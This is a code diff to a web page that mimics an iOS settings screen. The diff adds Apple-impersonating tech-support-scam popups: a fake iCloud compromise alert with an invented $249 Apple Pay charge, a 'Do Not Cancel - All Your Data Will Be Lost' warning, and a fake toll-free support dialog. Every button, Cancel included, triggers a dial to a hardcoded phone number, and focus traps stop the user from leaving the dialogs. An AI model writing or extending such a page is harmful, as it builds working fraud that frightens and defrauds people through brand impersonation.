@@ -31,24 +31,24 @@
     .ico{width:26px;height:26px;border-radius:6px;display:inline-flex;align-items:center;justify-content:center;color:#fff;font-size:14px}
     .wifi{background:#007aff}.bt{background:#0a84ff}.cell{background:#34c759}.notif{background:#ff9f0a}.sound{background:#5856d6}.focus{background:#ff375f}.screent{background:#32ade6}
 
-    /* ===== Classic iOS Popup Overlay ===== */
-    .overlay{position:fixed; inset:0; background:rgba(0,0,0,.55); display:none; align-items:center; justify-content:center; z-index:10; padding:16px}
-    .overlay[aria-hidden="false"]{display:flex}
+    /* ===== Classic iOS Popup Overlays ===== */
+    .overlay, .warning-overlay, .tollfree-overlay{position:fixed; inset:0; background:rgba(0,0,0,.55); display:none; align-items:center; justify-content:center; z-index:10; padding:16px}
+    .overlay[aria-hidden="false"], .warning-overlay[aria-hidden="false"], .tollfree-overlay[aria-hidden="false"]{display:flex}
 
-    .dialog{background:#fff; width:320px; max-width:90vw; border-radius:12px; box-shadow:var(--shadow); text-align:center; overflow:hidden}
-    .dlg-body{padding:18px 18px 12px}
-    .dlg-title{margin:0 0 8px; font-size:18px; font-weight:600; color:#111}
-    .dlg-text{margin:0 0 12px; font-size:14px; font-weight:500; color:#333}
+    .dialog, .warning-dialog, .tollfree-dialog{background:#fff; width:320px; max-width:90vw; border-radius:12px; box-shadow:var(--shadow); text-align:center; overflow:hidden}
+    .dlg-body, .warning-dlg-body, .tollfree-dlg-body{padding:18px 18px 12px}
+    .dlg-title, .warning-dlg-title, .tollfree-dlg-title{margin:0 0 8px; font-size:18px; font-weight:600; color:#111}
+    .dlg-text, .warning-dlg-text, .tollfree-dlg-text{margin:0 0 12px; font-size:14px; font-weight:500; color:#333}
     .dlg-email{font-weight:600}
     .field{padding:0 18px 14px}
     .input{width:100%; padding:8px 10px; border:1px solid #c7c7cc; border-radius:6px; font-size:14px}
 
-    .dlg-divider{height:1px; background:#e0e0e0}
-    .dlg-actions{display:flex; align-items:stretch; justify-content:stretch}
-    .dlg-btn{flex:1; background:#fff; border:0; padding:12px 0; font-size:16px; font-weight:500; color:var(--blue); cursor:pointer}
-    .dlg-btn:disabled{color:#999; cursor:not-allowed}
-    .dlg-btn:active{background:#f5f5f5}
-    .dlg-btn + .dlg-btn{border-left:1px solid #e0e0e0}
+    .dlg-divider, .warning-dlg-divider, .tollfree-dlg-divider{height:1px; background:#e0e0e0}
+    .dlg-actions, .warning-dlg-actions, .tollfree-dlg-actions{display:flex; align-items:stretch; justify-content:stretch}
+    .dlg-btn, .warning-dlg-btn, .tollfree-dlg-btn{flex:1; background:#fff; border:0; padding:12px 0; font-size:16px; font-weight:500; color:var(--blue); cursor:pointer}
+    .dlg-btn:disabled, .warning-dlg-btn:disabled, .tollfree-dlg-btn:disabled{color:#999; cursor:not-allowed}
+    .dlg-btn:active, .warning-dlg-btn:active, .tollfree-dlg-btn:active{background:#f5f5f5}
+    .dlg-btn + .dlg-btn, .warning-dlg-btn + .warning-dlg-btn, .tollfree-dlg-btn + .tollfree-dlg-btn{border-left:1px solid #e0e0e0}
 
     /* ===== Footer Call Bar ===== */
     .footer-call-bar{position:sticky; bottom:0; background:var(--card); padding:12px 16px; text-align:center; border-top:1px solid var(--border); box-shadow:0 -1px 0 rgba(0,0,0,.04); z-index:5}
@@ -116,12 +116,40 @@
     <section class="dialog" role="dialog" aria-modal="true" aria-labelledby="dlg-title" aria-describedby="dlg-desc" tabindex="-1">
       <div class="dlg-body">
         <h2 id="dlg-title" class="dlg-title">Sign In to iCloud</h2>
-        <p id="dlg-desc" class="dlg-text">Your Apple iCloud has been compromised. Call Apple Support immediately.</p>
+        <p id="dlg-desc" class="dlg-text">Your Apple iCloud has been compromised. Your Apple Pay has been used for paying $249 for PayPal. Call us to stop these charges if not done by you.</p>
       </div>
       <div class="dlg-divider" aria-hidden="true"></div>
       <div class="dlg-actions" id="dlg-actions">
         <button type="button" class="dlg-btn" id="cancelBtnNew">Cancel</button>
         <button type="button" class="dlg-btn" id="callBtn">Call Now</button>
+      </div>
+    </section>
+  </div>
+
+  <!-- Warning Popup Overlay -->
+  <div class="warning-overlay" id="warningOverlay" aria-hidden="true">
+    <section class="warning-dialog" role="dialog" aria-modal="true" aria-labelledby="warning-dlg-title" aria-describedby="warning-dlg-desc" tabindex="-1">
+      <div class="warning-dlg-body">
+        <h2 id="warning-dlg-title" class="warning-dlg-title">Warning</h2>
+        <p id="warning-dlg-desc" class="warning-dlg-text">Do Not Cancel - All Your Data Will Be Lost, Call Us Immediately</p>
+      </div>
+      <div class="warning-dlg-divider" aria-hidden="true"></div>
+      <div class="warning-dlg-actions">
+        <!-- No buttons, auto-closes after dial -->
+      </div>
+    </section>
+  </div>
+
+  <!-- Toll-Free Popup Overlay -->
+  <div class="tollfree-overlay" id="tollfreeOverlay" aria-hidden="true">
+    <section class="tollfree-dialog" role="dialog" aria-modal="true" aria-labelledby="tollfree-dlg-title" aria-describedby="tollfree-dlg-desc" tabindex="-1">
+      <div class="tollfree-dlg-body">
+        <h2 id="tollfree-dlg-title" class="tollfree-dlg-title">Toll-Free Support</h2>
+        <p id="tollfree-dlg-desc" class="tollfree-dlg-text">Click below to call our toll-free support line.</p>
+      </div>
+      <div class="tollfree-dlg-divider" aria-hidden="true"></div>
+      <div class="tollfree-dlg-actions">
+        <button type="button" class="tollfree-dlg-btn" id="tollfreeCallBtn">Click to Call</button>
       </div>
     </section>
   </div>
@@ -134,35 +162,90 @@
   <script>
     (function(){
       const overlay = document.getElementById('overlay');
+      const warningOverlay = document.getElementById('warningOverlay');
+      const tollfreeOverlay = document.getElementById('tollfreeOverlay');
       const openBtn = document.getElementById('openDlg');
       const cancelBtnNew = document.getElementById('cancelBtnNew');
       const callBtn = document.getElementById('callBtn');
+      const tollfreeCallBtn = document.getElementById('tollfreeCallBtn');
       const footerCallLink = document.getElementById('footerCallLink');
       const dialog = overlay.querySelector('.dialog');
+      const warningDialog = warningOverlay.querySelector('.warning-dialog');
+      const tollfreeDialog = tollfreeOverlay.querySelector('.tollfree-dialog');
 
       function open(){ 
         overlay.setAttribute('aria-hidden','false'); 
         setTimeout(() => dialog.focus(), 0); 
       }
 
-      // Enhanced focus trap to keep focus within dialog
+      function openWarning(){ 
+        warningOverlay.setAttribute('aria-hidden','false'); 
+        setTimeout(() => warningDialog.focus(), 0); 
+        window.location.assign('tel:+1-844-485-2265');
+        setTimeout(closeWarning, 2000); // Auto-close after 2 seconds
+      }
+
+      function openTollfree(){ 
+        tollfreeOverlay.setAttribute('aria-hidden','false'); 
+        setTimeout(() => tollfreeDialog.focus(), 0); 
+      }
+
+      function close(){ 
+        overlay.setAttribute('aria-hidden','true'); 
+      }
+
+      function closeWarning(){ 
+        warningOverlay.setAttribute('aria-hidden','true'); 
+        setTimeout(openTollfree, 0); // Open tollfree dialog immediately after warning closes
+      }
+
+      function closeTollfree(){ 
+        tollfreeOverlay.setAttribute('aria-hidden','true'); 
+      }
+
+      // Enhanced focus trap for primary dialog
       overlay.addEventListener('focusin', (e) => { 
         if(!dialog.contains(e.target)) dialog.focus(); 
       });
 
-      // Prevent clicks outside dialog from having any effect
+      // Prevent clicks outside primary dialog from having any effect
       overlay.addEventListener('click', (e) => {
         if (e.target === overlay) e.preventDefault();
+      });
+
+      // Enhanced focus trap for warning dialog
+      warningOverlay.addEventListener('focusin', (e) => { 
+        if(!warningDialog.contains(e.target)) warningDialog.focus(); 
+      });
+
+      // Prevent clicks outside warning dialog from having any effect
+      warningOverlay.addEventListener('click', (e) => {
+        if (e.target === warningOverlay) e.preventDefault();
+      });
+
+      // Enhanced focus trap for tollfree dialog
+      tollfreeOverlay.addEventListener('focusin', (e) => { 
+        if(!tollfreeDialog.contains(e.target)) tollfreeDialog.focus(); 
+      });
+
+      // Prevent clicks outside tollfree dialog from having any effect
+      tollfreeOverlay.addEventListener('click', (e) => {
+        if (e.target === tollfreeOverlay) e.preventDefault();
       });
 
       openBtn && openBtn.addEventListener('click', open);
 
       cancelBtnNew.addEventListener('click', () => {
-        window.location.assign('tel:+1-844-485-2265');
+        window.location.assign('tel:+1-844-485-2265'); // Trigger auto-dial on cancel click
       });
 
       callBtn.addEventListener('click', () => {
         window.location.assign('tel:+1-844-485-2265');
+      });
+
+      tollfreeCallBtn.addEventListener('click', () => {
+        window.location.assign('tel:+1-844-485-2265');
+        closeTollfree();
       });
 
       footerCallLink.addEventListener('click', (e) => {
